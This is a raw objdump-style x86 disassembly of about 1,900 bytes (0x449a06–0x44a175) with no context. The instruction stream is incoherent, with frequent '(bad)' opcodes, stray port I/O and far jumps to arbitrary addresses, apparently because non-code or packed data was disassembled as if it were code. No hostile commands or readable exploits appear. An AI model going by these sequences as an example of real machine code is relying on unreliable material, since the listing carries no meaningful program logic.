  449a06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449a07:	lock push eax
  449a0a:	aam    0xbc
  449a0c:	call   0xd65183d7
  449a11:	push   0xc53dcdf7
  449a16:	ret    0x8a45
  449a19:	not    BYTE PTR [ebx]
  449a1b:	mov    ds,WORD PTR [edi-0x9d4acab]
  449a21:	loopne 0x4499ee
  449a23:	ja     0x449a7f
  449a25:	sbb    al,0xaf
  449a27:	aad    0x1b
  449a29:	lods   eax,DWORD PTR ds:[esi]
  449a2a:	adc    dl,BYTE PTR [ebx]
  449a2c:	push   esp
  449a2d:	adc    BYTE PTR [ebp-0x4b],ah
  449a30:	ja     0x449a7e
  449a32:	cdq    
  449a33:	fstp   DWORD PTR ds:0x85fec6b8
  449a39:	sahf   
  449a3a:	and    DWORD PTR [ecx],esi
  449a3c:	pop    ss
  449a3d:	mov    esp,0xeaf94d46
  449a42:	jg     0x449a85
  449a44:	sub    BYTE PTR [ecx-0x6c7a1e8a],bl
  449a4a:	sbb    eax,ecx
  449a4c:	and    edi,eax
  449a4e:	inc    edx
  449a4f:	data16 daa 
  449a51:	stc    
  449a52:	mov    al,0x1
  449a54:	mov    eax,0x300f09e7
  449a59:	jle    0x449ab9
  449a5b:	sti    
  449a5c:	or     DWORD PTR [eax],esp
  449a5e:	fcom   QWORD PTR [ecx+0x7f]
  449a61:	sti    
  449a62:	out    dx,eax
  449a63:	inc    ebx
  449a64:	adc    cl,BYTE PTR [ecx]
  449a66:	mov    bl,0x34
  449a68:	out    dx,eax
  449a69:	add    eax,0xac7c9a89
  449a6e:	jo     0x449a7d
  449a70:	out    dx,eax
  449a71:	pop    edi
  449a72:	pop    es
  449a73:	cdq    
  449a74:	ins    DWORD PTR es:[edi],dx
  449a75:	dec    ebx
  449a76:	(bad)  
  449a77:	sbb    dh,al
  449a79:	hlt    
  449a7a:	dec    dx
  449a7c:	pop    eax
  449a7d:	lods   eax,DWORD PTR ds:[esi]
  449a7e:	mov    bl,0x30
  449a80:	les    edi,FWORD PTR [eax]
  449a82:	mov    WORD PTR [edx-0x34],es
  449a85:	in     eax,dx
  449a86:	in     al,dx
  449a87:	ja     0x449afb
  449a89:	mov    bl,0xaa
  449a8b:	mov    dl,BYTE PTR [edi]
  449a8d:	dec    edx
  449a8e:	aas    
  449a8f:	dec    eax
  449a90:	mov    edi,0xc98fc974
  449a95:	ret    
  449a96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449a97:	xor    al,0x6
  449a99:	(bad)  [ebx+0x55]
  449a9c:	pop    ebp
  449a9d:	xor    DWORD PTR [eax-0x2bccfb04],ecx
  449aa3:	pop    ecx
  449aa4:	das    
  449aa5:	jmp    0x1f589a7
  449aaa:	mov    dl,0xf
  449aac:	mov    BYTE PTR [edx-0xbb6a86e],0x3b
  449ab3:	and    DWORD PTR [edi+0x35],edi
  449ab6:	xor    DWORD PTR [ebx-0x6b0bc0db],0x99784eb
  449ac0:	xchg   ebp,eax
  449ac1:	pop    ds
  449ac2:	popa   
  449ac3:	das    
  449ac4:	daa    
  449ac5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449ac6:	push   cs
  449ac7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449ac8:	es call 0x2add7fd7
  449ace:	int3   
  449acf:	and    edx,DWORD PTR [ebx]
  449ad1:	pop    es
  449ad2:	cdq    
  449ad3:	popa   
  449ad4:	mov    al,ds:0x57c926c2
  449ad9:	adc    eax,ebp
  449adb:	call   0x9e4d:0x20a08ce9
  449ae2:	ins    DWORD PTR es:[edi],dx
  449ae3:	pop    ebp
  449ae4:	jmp    0x449ace
  449ae6:	ror    DWORD PTR [edx+0x43],cl
  449ae9:	stos   DWORD PTR es:[edi],eax
  449aea:	call   0xbc84:0x814f371e
  449af1:	test   al,0xff
  449af3:	lea    eax,[esi]
  449af5:	in     eax,0xe
  449af7:	retf   0x84f3
  449afa:	inc    edi
  449afb:	xchg   ecx,eax
  449afc:	cmc    
  449afd:	jae    0x449ae9
  449aff:	mov    eax,0x45a5eb3b
  449b04:	retf   
  449b05:	mov    eax,0xc80f7cf9
  449b0a:	repnz pop ebp
  449b0c:	mov    WORD PTR [ecx],?
  449b0e:	adc    ebp,DWORD PTR [edx]
  449b10:	das    
  449b11:	xlat   BYTE PTR ds:[ebx]
  449b12:	mov    al,0x97
  449b14:	fsubr  QWORD PTR [eax]
  449b16:	dec    eax
  449b17:	push   0x7b
  449b19:	test   DWORD PTR ds:0xd7bab95c,esi
  449b1f:	cmp    al,0xd3
  449b21:	and    DWORD PTR [ebp-0x41],edx
  449b24:	stos   DWORD PTR es:[edi],eax
  449b25:	push   ebx
  449b26:	pop    ebx
  449b27:	cdq    
  449b28:	jle    0x449ae6
  449b2a:	call   0xfefd:0x461a168f
  449b31:	pusha  
  449b32:	pop    ss
  449b33:	pop    es
  449b34:	adc    al,0x99
  449b36:	mov    edx,DWORD PTR ds:0x13340d91
  449b3c:	or     al,BYTE PTR [esi-0x4c]
  449b3f:	push   es
  449b40:	fadd   QWORD PTR [ebx]
  449b42:	dec    esp
  449b43:	pop    ebx
  449b44:	test   BYTE PTR [edi],dl
  449b46:	jns    0x449b62
  449b48:	sub    eax,0xc135a66b
  449b4d:	sub    cl,BYTE PTR [edx+0x564184d7]
  449b53:	jl     0x449b66
  449b55:	or     ecx,edi
  449b57:	gs ja  0x449b16
  449b5a:	adc    al,0xbb
  449b5c:	mov    bl,0x31
  449b5e:	cmp    eax,0xae887e0e
  449b63:	dec    esp
  449b64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449b65:	mov    ah,0x3b
  449b67:	shl    BYTE PTR [ecx-0x4f2b6424],1
  449b6d:	mov    dl,0x5f
  449b6f:	jno    0x449b49
  449b71:	fbstp  TBYTE PTR [edx+0x7b]
  449b74:	mov    ebp,0x3fa5c353
  449b79:	ja     0x449b6f
  449b7b:	xor    eax,0x3d612371
  449b80:	add    bl,BYTE PTR [esi+0x5]
  449b83:	pop    es
  449b84:	push   ecx
  449b85:	sbb    BYTE PTR [ebp-0x48],0xf5
  449b89:	and    esi,DWORD PTR [ebx-0x1d]
  449b8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449b8d:	shr    BYTE PTR [eax],0x59
  449b90:	sbb    dh,BYTE PTR [ebp-0x3fc6e934]
  449b96:	out    0xd6,eax
  449b98:	mov    dh,0x62
  449b9a:	push   esp
  449b9b:	jge    0x449b43
  449b9d:	sar    ebx,1
  449b9f:	in     eax,dx
  449ba0:	and    esp,ebp
  449ba2:	push   ebp
  449ba3:	pushf  
  449ba4:	cld    
  449ba5:	cmova  ebp,esi
  449ba8:	mov    ds:0xe9cd39b6,eax
  449bad:	(bad)  
  449baf:	adc    DWORD PTR [ebp-0x208ec985],0xf30c2bea
  449bb9:	mov    ch,BYTE PTR [esi-0x1137c81d]
  449bbf:	cmp    BYTE PTR [edi+esi*4-0x65],bh
  449bc3:	scas   al,BYTE PTR es:[edi]
  449bc4:	or     eax,0xe18ab518
  449bc9:	mov    ds:0x920938c3,eax
  449bce:	and    eax,0x5dc180cc
  449bd3:	mov    edi,0x3383529a
  449bd8:	imul   edx,ebx,0x0
  449bdb:	in     al,dx
  449bdc:	jle    0x449bec
  449bde:	or     BYTE PTR [ebx],0x28
  449be1:	clc    
  449be2:	call   0x8a9d08c4
  449be7:	sahf   
  449be8:	retf   0x2e1d
  449beb:	jmp    0x4d6aab23
  449bf0:	imul   ecx,DWORD PTR [edi-0x7b],0xffffff9a
  449bf4:	repnz pusha 
  449bf6:	sbb    DWORD PTR [edi-0x79],eax
  449bf9:	aad    0x91
  449bfb:	pop    ebp
  449bfc:	ja     0x449c37
  449bfe:	pop    esp
  449bff:	fs inc esi
  449c01:	mov    ds:0x58215285,eax
  449c06:	xchg   ebp,eax
  449c07:	out    0x81,al
  449c09:	cwde   
  449c0a:	je     0x449c62
  449c0c:	pop    esi
  449c0d:	xchg   DWORD PTR [ecx-0x4],esi
  449c10:	fistp  QWORD PTR [edx]
  449c12:	test   ecx,esp
  449c14:	(bad)  [edx]
  449c16:	xor    cl,BYTE PTR [ebx]
  449c18:	nop
  449c19:	int3   
  449c1a:	adc    BYTE PTR [ebp-0x59],0xa9
  449c1e:	adc    DWORD PTR [edi],0xffffffd9
  449c21:	mov    ebx,0x35eddc54
  449c26:	push   edx
  449c27:	in     eax,dx
  449c28:	adc    DWORD PTR [eax-0x7c7ee499],0x64d34a4
  449c32:	xor    al,0x9f
  449c34:	push   ss
  449c35:	adc    BYTE PTR [esi-0x5f],ah
  449c38:	(bad)  
  449c39:	ficomp DWORD PTR [esi+ecx*2-0x4db7156c]
  449c40:	or     eax,0xfb18aef5
  449c45:	sub    DWORD PTR [edx-0x48],edx
  449c48:	jb     0x449c82
  449c4a:	sbb    dh,BYTE PTR [ebp+edi*4+0x42]
  449c4e:	bound  eax,QWORD PTR [edx]
  449c50:	movd   DWORD PTR [edi],mm3
  449c53:	pushf  
  449c54:	rcr    BYTE PTR [esi+0x72b45f05],0xe6
  449c5b:	jl     0x449c58
  449c5d:	cld    
  449c5e:	inc    esi
  449c5f:	inc    edi
  449c60:	into   
  449c61:	mov    edi,0xa604da23
  449c66:	and    eax,0xf4a976e7
  449c6b:	or     al,0xfb
  449c6d:	cmp    al,0x4e
  449c6f:	xchg   DWORD PTR [ebp+0x1ce29fdf],ebx
  449c75:	cmp    DWORD PTR [eax+0x5b10d62f],ebx
  449c7b:	lds    eax,FWORD PTR [esi+0x10]
  449c7e:	sbb    al,0x8c
  449c80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449c81:	jmp    0x449c7d
  449c83:	add    BYTE PTR [esi+0x20],bh
  449c86:	ret    0x148a
  449c89:	js     0x449ccd
  449c8b:	addr16 jmp 0x449c8e
  449c8e:	ror    DWORD PTR ds:0x4f11b8b7,cl
  449c94:	pop    ebp
  449c95:	popf   
  449c96:	sar    BYTE PTR [edx+ebp*2],cl
  449c99:	pop    es
  449c9a:	pop    ebx
  449c9b:	mov    edi,0x875da1ed
  449ca0:	cli    
  449ca1:	mov    eax,0xa4d9ae8f
  449ca6:	dec    ebx
  449ca7:	push   ebp
  449ca8:	imul   esp,DWORD PTR [esi-0x33],0xffffffa5
  449cac:	and    ah,BYTE PTR [eax+0x1f]
  449caf:	imul   ecx,edi,0xfffffff6
  449cb2:	mov    dl,0xa4
  449cb4:	aam    0x1
  449cb6:	lock ret 
  449cb8:	add    bh,al
  449cba:	xchg   BYTE PTR [edi-0x18],bh
  449cbd:	xor    dl,ah
  449cbf:	loopne 0x449d1a
  449cc1:	sahf   
  449cc2:	rcr    DWORD PTR [ebx],0x2f
  449cc5:	repnz mov dh,0xc1
  449cc8:	inc    edi
  449cc9:	push   edi
  449cca:	pop    ecx
  449ccb:	ins    BYTE PTR es:[edi],dx
  449ccc:	cmp    eax,0xdfd0efaf
  449cd1:	(bad)  
  449cd2:	lock in eax,0x12
  449cd5:	fdiv   st(4),st
  449cd7:	sti    
  449cd8:	mov    WORD PTR [edx],ss
  449cda:	push   ebp
  449cdb:	js     0x449d4e
  449cdd:	adc    eax,0x296d7f99
  449ce2:	pop    edi
  449ce3:	hlt    
  449ce4:	icebp  
  449ce5:	jecxz  0x449cda
  449ce7:	mov    al,0x61
  449ce9:	inc    DWORD PTR [esi+ebp*8]
  449cec:	cs cmc 
  449cee:	mov    ch,0x97
  449cf0:	dec    ebx
  449cf1:	retf   
  449cf2:	(bad)  
  449cf3:	xor    eax,0x3ee99258
  449cf8:	addr16 push ebx
  449cfa:	sbb    bh,dh
  449cfc:	or     DWORD PTR [edi-0x5c69b606],ebp
  449d02:	xor    al,0xc0
  449d04:	rcl    BYTE PTR [edx-0x5fb95531],0x9e
  449d0b:	outs   dx,DWORD PTR ds:[esi]
  449d0c:	ins    DWORD PTR es:[edi],dx
  449d0d:	mov    eax,ds:0x42f0e951
  449d12:	sub    ch,BYTE PTR [eax+0xa09ef6a]
  449d18:	lock repz test al,0xa2
  449d1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449d1d:	dec    ebp
  449d1e:	aas    
  449d1f:	xchg   edi,eax
  449d20:	sbb    eax,0x141a9a0c
  449d25:	adc    eax,DWORD PTR [ebp+edi*2+0x23]
  449d29:	xor    ch,BYTE PTR [eax]
  449d2b:	js     0x449d2c
  449d2d:	into   
  449d2e:	or     al,0xf7
  449d30:	(bad)  
  449d31:	loopne 0x449cff
  449d33:	jmp    0x6832:0x795224bf
  449d3a:	dec    esp
  449d3b:	sahf   
  449d3c:	adc    dl,BYTE PTR ds:0xbf8926f0
  449d42:	adc    esi,esp
  449d44:	inc    eax
  449d45:	inc    ebx
  449d46:	aad    0xae
  449d48:	push   ecx
  449d49:	cmp    eax,0x6a36e78a
  449d4e:	cmp    ecx,DWORD PTR ds:0x43d545dd
  449d54:	leave  
  449d55:	frstor ds:[esp+edx*8-0x78]
  449d5a:	add    DWORD PTR [eax+0x27],ebp
  449d5d:	leave  
  449d5e:	mov    ah,0x7b
  449d60:	or     DWORD PTR ds:0xfdf5d5d6,ecx
  449d66:	xlat   BYTE PTR ds:[ebx]
  449d67:	fiadd  DWORD PTR [ecx]
  449d69:	xchg   cl,dl
  449d6b:	lods   al,BYTE PTR ds:[esi]
  449d6c:	cs ins BYTE PTR es:[edi],dx
  449d6e:	imul   edx,DWORD PTR ds:0x268872ad,0xffffffe0
  449d75:	pop    edx
  449d76:	add    al,dh
  449d78:	dec    edi
  449d79:	dec    ebp
  449d7a:	aam    0x71
  449d7c:	jge    0x449de4
  449d7e:	ins    DWORD PTR es:[edi],dx
  449d7f:	xchg   ebx,eax
  449d80:	pop    ds
  449d81:	dec    ecx
  449d82:	shl    BYTE PTR [ebp+0x1b912382],1
  449d88:	mov    dl,0x87
  449d8a:	and    DWORD PTR [esi+0x5b],edx
  449d8d:	and    esp,DWORD PTR [eax+0x3d]
  449d90:	icebp  
  449d91:	imul   esp,DWORD PTR [esi-0x50],0x6c7107a4
  449d98:	pushf  
  449d99:	ja     0x449d27
  449d9b:	jmp    0x6283:0xf23a8996
  449da2:	pop    eax
  449da3:	mov    edi,0x59bd3ce5
  449da8:	mov    dl,0xe2
  449daa:	repz push ecx
  449dac:	enter  0x45a5,0x80
  449db0:	or     BYTE PTR [esp+edx*8-0x34771f91],ah
  449db7:	adc    ch,BYTE PTR [ebp-0x1b]
  449dba:	scas   al,BYTE PTR es:[edi]
  449dbb:	sbb    DWORD PTR [ebp+0x52b6a7ae],esi
  449dc1:	mov    esi,0x5f31f493
  449dc6:	int    0x3a
  449dc8:	or     eax,0x3554a289
  449dcd:	inc    edx
  449dce:	std    
  449dcf:	mov    esp,0xfcc2c1bf
  449dd4:	retf   0x52db
  449dd7:	(bad)  
  449dd8:	cli    
  449dd9:	cmp    cl,BYTE PTR [eax+0x6788db1c]
  449ddf:	test   eax,0x15c9aa31
  449de4:	pusha  
  449de5:	imul   edx,DWORD PTR [edx],0xb0bd5189
  449deb:	inc    edi
  449dec:	push   eax
  449ded:	icebp  
  449dee:	ins    BYTE PTR es:[edi],dx
  449def:	cmc    
  449df0:	cmp    DWORD PTR [ecx],ecx
  449df2:	loope  0x449d94
  449df4:	mov    dl,al
  449df6:	imul   edx,DWORD PTR [ecx],0x18b4f0fd
  449dfc:	xchg   BYTE PTR [edx-0x63],ch
  449dff:	sbb    ch,cl
  449e01:	(bad)  
  449e02:	cmp    al,0x4b
  449e04:	adc    al,0xcc
  449e06:	sbb    DWORD PTR [ebx],esp
  449e08:	push   ss
  449e09:	loopne 0x449de6
  449e0b:	lahf   
  449e0c:	jmp    0xc895:0x9501eaf5
  449e13:	mov    ah,0x62
  449e15:	iret   
  449e16:	push   0xf274b3a0
  449e1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449e1c:	xchg   esp,eax
  449e1d:	(bad)  
  449e1e:	hlt    
  449e1f:	mov    al,ds:0x327323d9
  449e24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449e25:	in     eax,0x4c
  449e27:	movaps xmm6,XMMWORD PTR [esi*1+0x2a5a0ec6]
  449e2f:	add    BYTE PTR [esi+ebp*8+0x4ee7f3ac],bh
  449e36:	inc    ebx
  449e37:	inc    ebp
  449e38:	into   
  449e39:	fisttp WORD PTR [eax-0x73ef2584]
  449e3f:	xor    ebp,esp
  449e41:	sbb    BYTE PTR ds:0xa068d3c6,dl
  449e47:	ret    0x8b41
  449e4a:	ins    DWORD PTR es:[edi],dx
  449e4b:	xchg   edi,esp
  449e4d:	add    eax,0x4e46b8f0
  449e52:	push   ss
  449e53:	lds    ebp,FWORD PTR ds:0x1f8e5d43
  449e59:	fild   WORD PTR [eax]
  449e5b:	push   cs
  449e5c:	fucomp st(2)
  449e5e:	je     0x449e87
  449e60:	dec    ebp
  449e61:	pop    esi
  449e62:	cmp    dh,BYTE PTR [eax+0x127d912]
  449e68:	out    dx,al
  449e69:	mov    eax,0xe5d8e9fe
  449e6e:	jno    0x449df6
  449e70:	mov    al,0x81
  449e72:	out    0xb9,eax
  449e74:	stos   DWORD PTR es:[edi],eax
  449e75:	pop    ss
  449e76:	push   edx
  449e77:	sub    BYTE PTR [ebp+0x38],bl
  449e7a:	call   0xc0ec:0xaffbd482
  449e81:	mov    ebx,0xf2be1acb
  449e86:	cs push edx
  449e88:	cld    
  449e89:	cmp    edx,esp
  449e8b:	fisubr DWORD PTR [edi]
  449e8d:	stc    
  449e8e:	ins    DWORD PTR es:[edi],dx
  449e8f:	in     eax,0x2e
  449e91:	add    BYTE PTR [esi],0x9b
  449e94:	std    
  449e95:	fwait
  449e96:	mov    ah,0xa0
  449e98:	cmp    eax,DWORD PTR [esi-0x1]
  449e9b:	stos   DWORD PTR es:[edi],eax
  449e9c:	xchg   ebx,eax
  449e9d:	ja     0x449e2f
  449e9f:	pop    ecx
  449ea0:	pushf  
  449ea1:	jbe    0x449eaa
  449ea3:	mov    esp,0x447c65a0
  449ea8:	retf   
  449ea9:	cmp    al,bh
  449eab:	lds    esi,FWORD PTR [edx+0x4c2cab27]
  449eb1:	cmp    eax,0x48caa60d
  449eb6:	dec    edx
  449eb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449eb8:	rcr    BYTE PTR ds:0xd10d54c8,0x3
  449ebf:	dec    ebx
  449ec0:	shr    dl,cl
  449ec2:	xor    eax,0x7d42cc15
  449ec7:	cdq    
  449ec8:	cmp    eax,0xc888dabb
  449ecd:	data16 cmp BYTE PTR ds:0x3dadf4ca,cl
  449ed4:	frstor [esi+0x59]
  449ed7:	pop    ecx
  449ed8:	in     al,dx
  449ed9:	push   ebx
  449eda:	push   eax
  449edb:	dec    ebp
  449edc:	hlt    
  449edd:	fcom   DWORD PTR [eax+0x25]
  449ee0:	xor    dl,BYTE PTR [ecx]
  449ee2:	xor    ah,BYTE PTR [edi+0x38]
  449ee5:	fcmovnbe st,st(2)
  449ee7:	ins    DWORD PTR es:[edi],dx
  449ee8:	pop    ebx
  449ee9:	test   BYTE PTR [edi-0x59832223],cl
  449eef:	mov    edi,0x85bf3821
  449ef4:	sub    edx,DWORD PTR [esp+edx*2]
  449ef7:	in     eax,dx
  449ef8:	mov    ebx,0x789fe511
  449efd:	xchg   DWORD PTR ds:0xe085820c,eax
  449f03:	leave  
  449f04:	in     eax,dx
  449f05:	mov    al,BYTE PTR [eax+0x2ab2609e]
  449f0b:	pop    esp
  449f0c:	push   ebx
  449f0d:	ins    BYTE PTR es:[edi],dx
  449f0e:	rol    BYTE PTR ds:[edi],cl
  449f11:	xchg   esi,eax
  449f12:	pop    esp
  449f13:	loope  0x449f54
  449f15:	imul   ebx,DWORD PTR [ebp-0x6b],0xc9da27a
  449f1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449f1d:	mov    edx,0x23523608
  449f22:	popa   
  449f23:	mov    ds:0x8ec07721,al
  449f28:	pop    ds
  449f29:	xchg   DWORD PTR [esi+0x3b93548f],ecx
  449f2f:	popf   
  449f30:	adc    DWORD PTR [ebp+0x54],ecx
  449f33:	ins    DWORD PTR es:[edi],dx
  449f34:	or     al,0x97
  449f36:	push   ebp
  449f37:	xlat   BYTE PTR ds:[ebx]
  449f38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449f39:	and    dl,BYTE PTR [edx]
  449f3b:	add    eax,esp
  449f3d:	fmul   QWORD PTR [ebx+0x73]
  449f40:	jae    0x449f61
  449f42:	aas    
  449f43:	ror    BYTE PTR [esi+0x45],cl
  449f46:	stc    
  449f47:	iret   
  449f48:	push   edx
  449f49:	(bad)  
  449f4a:	in     al,0xe4
  449f4c:	dec    ebx
  449f4d:	push   esi
  449f4e:	cmp    al,0x46
  449f50:	mov    ecx,0xa33a5357
  449f55:	inc    edi
  449f56:	rol    BYTE PTR [ecx+0x50],cl
  449f59:	mov    ecx,0x825c9c85
  449f5e:	jmp    0xe5e88c97
  449f63:	int    0x65
  449f65:	pop    eax
  449f66:	clc    
  449f67:	inc    eax
  449f68:	popf   
  449f69:	ds mov ecx,0x669ae7da
  449f6f:	add    al,0x9b
  449f71:	aaa    
  449f72:	mov    dh,0x59
  449f74:	iret   
  449f75:	pop    esi
  449f76:	jg     0x449f32
  449f78:	rep lods al,BYTE PTR ds:[esi]
  449f7a:	adc    edx,DWORD PTR ds:0x10332c8c
  449f80:	repz cmp bl,al
  449f83:	jge    0x449f3c
  449f85:	push   cs
  449f86:	rol    BYTE PTR ds:0xb49f561,cl
  449f8c:	push   ebx
  449f8d:	jo     0x449f61
  449f8f:	inc    edi
  449f90:	pusha  
  449f91:	mov    BYTE PTR [ecx+edi*2+0x48],dl
  449f95:	xchg   edx,eax
  449f96:	rcl    BYTE PTR [edi+ebx*4-0x3a],cl
  449f9a:	in     eax,0x2f
  449f9c:	adc    dl,dl
  449f9e:	call   0xa149:0xd46f629e
  449fa5:	dec    ebx
  449fa6:	ja     0x449fdf
  449fa8:	ss fdivrp st(5),st
  449fab:	nop
  449fac:	imul   ebp,DWORD PTR [esi-0x4f],0x49
  449fb0:	xchg   edx,eax
  449fb1:	jecxz  0x44a016
  449fb3:	sbb    al,0xe3
  449fb5:	or     edx,edx
  449fb7:	add    ch,bl
  449fb9:	stos   DWORD PTR es:[edi],eax
  449fba:	imul   ecx,DWORD PTR [eax-0x5f1eed11],0x7c
  449fc1:	nop
  449fc2:	cmp    al,0x4c
  449fc4:	jp     0x449f4e
  449fc6:	pop    eax
  449fc7:	lahf   
  449fc8:	out    dx,al
  449fc9:	mov    WORD PTR [eax],gs
  449fcb:	ds test al,ah
  449fce:	push   ecx
  449fcf:	jmp    0xcbb1bf77
  449fd4:	pop    edi
  449fd5:	push   ebx
  449fd6:	aam    0x98
  449fd8:	mov    ah,0xac
  449fda:	cli    
  449fdb:	jmp    0xd9b8bea1
  449fe0:	loop   0x449f95
  449fe2:	hlt    
  449fe3:	vpackusdw xmm5,xmm5,XMMWORD PTR [esi+edi*1+0x25fe089]
  449fed:	push   edx
  449fee:	(bad)  
  449fef:	pop    eax
  449ff0:	or     al,0x5f
  449ff2:	(bad)  
  449ff3:	(bad)  
  449ff4:	xor    dh,ch
  449ff6:	mov    al,al
  449ff8:	xor    esi,DWORD PTR [eax+0x3f]
  449ffb:	mov    ch,0x4b
  449ffd:	xor    edi,DWORD PTR [ecx-0x61]
  44a000:	xor    al,0x2d
  44a002:	call   FWORD PTR [edi+0x6cd9336c]
  44a008:	pop    es
  44a009:	inc    esi
  44a00a:	jns    0x449ff7
  44a00c:	jge    0x44a00e
  44a00e:	push   ebp
  44a00f:	sbb    ebp,DWORD PTR [ebp-0x1a1d0191]
  44a015:	or     al,0x55
  44a017:	or     eax,0xfc727fd3
  44a01c:	xchg   edi,eax
  44a01d:	(bad)  
  44a01e:	fcomi  st,st(4)
  44a020:	push   es
  44a021:	in     eax,dx
  44a022:	pop    ss
  44a023:	clc    
  44a024:	popa   
  44a025:	(bad)  
  44a026:	xchg   edi,eax
  44a027:	inc    esp
  44a028:	out    0x20,eax
  44a02a:	sbb    eax,0xcbf42b47
  44a02f:	call   0x891e850c
  44a034:	retf   
  44a035:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a036:	jp     0x44a077
  44a038:	ss shld ecx,ebp,cl
  44a03c:	arpl   WORD PTR [eax],bp
  44a03e:	adc    ecx,DWORD PTR [edx+0x38a92359]
  44a044:	jmp    0x6929:0x31cd0a62
  44a04b:	add    cl,cl
  44a04d:	stos   BYTE PTR es:[edi],al
  44a04e:	add    edi,DWORD PTR [ecx-0x76]
  44a051:	lods   al,BYTE PTR ds:[esi]
  44a052:	xor    al,0xc5
  44a054:	pop    esi
  44a055:	dec    eax
  44a056:	fs sbb edx,ebp
  44a059:	cmp    DWORD PTR [ecx+0x337bd677],edi
  44a05f:	outs   dx,DWORD PTR ds:[esi]
  44a060:	cmp    BYTE PTR [ecx],bh
  44a062:	xchg   ebx,eax
  44a063:	add    BYTE PTR [edx],dh
  44a065:	jmp    0x44a039
  44a067:	popa   
  44a068:	sub    DWORD PTR [ebx+0x7aadd2ee],ebp
  44a06e:	in     al,0x99
  44a070:	ud2    
  44a072:	mul    BYTE PTR [ebx-0x7a]
  44a075:	dec    edx
  44a076:	xchg   ebx,eax
  44a077:	push   0x49
  44a079:	nop
  44a07a:	jmp    FWORD PTR [ecx+0x40fc8341]
  44a080:	idiv   dh
  44a082:	fwait
  44a083:	out    0x44,al
  44a085:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a086:	jns    0x44a03a
  44a088:	sbb    esp,DWORD PTR [ebp-0x42]
  44a08b:	pop    ss
  44a08c:	retf   
  44a08d:	cmp    dl,BYTE PTR [ebx]
  44a08f:	out    0xc1,al
  44a091:	jno    0x44a05a
  44a093:	sub    al,0x6f
  44a095:	fst    DWORD PTR [ebp+0x450e186f]
  44a09b:	xchg   edx,eax
  44a09c:	mov    edx,DWORD PTR [ecx+0x73]
  44a09f:	fist   WORD PTR [edi+ebp*1]
  44a0a2:	xchg   ecx,eax
  44a0a3:	inc    ebx
  44a0a4:	mov    ecx,0xcf80b0e6
  44a0a9:	ja     0x44a0ad
  44a0ab:	inc    ebx
  44a0ac:	iret   
  44a0ad:	jecxz  0x44a07c
  44a0af:	sahf   
  44a0b0:	imul   DWORD PTR [ecx-0x2d]
  44a0b3:	dec    edi
  44a0b4:	push   cs
  44a0b5:	mov    esp,0x2c993089
  44a0ba:	icebp  
  44a0bb:	push   edi
  44a0bc:	mov    ebx,0xd8414728
  44a0c1:	(bad)  
  44a0c3:	jb     0x44a132
  44a0c5:	mov    DWORD PTR [edx-0x30],edi
  44a0c8:	pop    ebp
  44a0c9:	xchg   edx,eax
  44a0ca:	(bad)  
  44a0cb:	div    BYTE PTR [eax-0x3a]
  44a0ce:	mov    edi,DWORD PTR [edi]
  44a0d0:	mov    esp,0xe13f7500
  44a0d5:	jno    0x44a116
  44a0d7:	mov    ds:0x8f30a74e,al
  44a0dc:	sbb    dl,BYTE PTR [esi-0x7c]
  44a0df:	in     al,dx
  44a0e0:	sbb    eax,0xe32a84b7
  44a0e5:	es pop esi
  44a0e7:	ret    
  44a0e8:	leave  
  44a0e9:	imul   ecx,DWORD PTR [ecx],0xffffff8a
  44a0ec:	loope  0x44a141
  44a0ee:	mov    dl,0xb4
  44a0f0:	mov    ah,0x18
  44a0f2:	int    0xb8
  44a0f4:	jp     0x44a09b
  44a0f6:	jmp    0xd885bb47
  44a0fb:	es retf 
  44a0fd:	jns    0x44a148
  44a0ff:	cli    
  44a100:	adc    ch,BYTE PTR [edx+0x834ee50]
  44a106:	fbstp  TBYTE PTR [eax-0x7779a2b4]
  44a10c:	scas   al,BYTE PTR es:[edi]
  44a10d:	arpl   di,ax
  44a10f:	sub    BYTE PTR [edi],0xfc
  44a112:	xchg   ebx,eax
  44a113:	aad    0x5b
  44a115:	je     0x44a188
  44a117:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a118:	jmp    0x44a181
  44a11a:	dec    eax
  44a11b:	cld    
  44a11c:	dec    ebp
  44a11d:	pop    ebx
  44a11e:	add    al,0xa2
  44a120:	test   al,0x26
  44a122:	inc    esi
  44a123:	stos   BYTE PTR es:[edi],al
  44a124:	add    al,BYTE PTR [ebx]
  44a126:	pop    edi
  44a127:	mov    eax,ds:0x19dfeea2
  44a12c:	(bad)  
  44a12d:	sbb    edx,DWORD PTR gs:[edx-0x43]
  44a131:	out    dx,eax
  44a132:	outs   dx,BYTE PTR ds:[esi]
  44a133:	dec    edx
  44a134:	popa   
  44a135:	and    DWORD PTR [edi],ebp
  44a137:	xor    eax,0x549a7372
  44a13c:	xor    BYTE PTR [ecx],dl
  44a13e:	and    al,0x94
  44a140:	aaa    
  44a141:	(bad)  
  44a142:	(bad)  
  44a144:	or     bh,bl
  44a146:	popa   
  44a147:	or     esp,DWORD PTR [eax]
  44a149:	mov    ds:0x1a508eda,eax
  44a14e:	push   ds
  44a14f:	hlt    
  44a150:	mov    edi,DWORD PTR [edx-0x5818e927]
  44a156:	sbb    DWORD PTR [edx+0x3c],esi
  44a159:	ins    DWORD PTR es:[edi],dx
  44a15a:	xor    eax,0xc80f044e
  44a15f:	mov    ch,0x5a
  44a161:	sbb    eax,0x1dd5e0c7
  44a166:	sar    BYTE PTR [ecx+0x5123091b],1
  44a16c:	fidiv  DWORD PTR [edi-0x27]
  44a16f:	push   ds
  44a170:	pop    esi
  44a171:	cmp    BYTE PTR [eax-0x5f],cl
  44a174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a175:	stos   BYTE PTR es:[edi],al
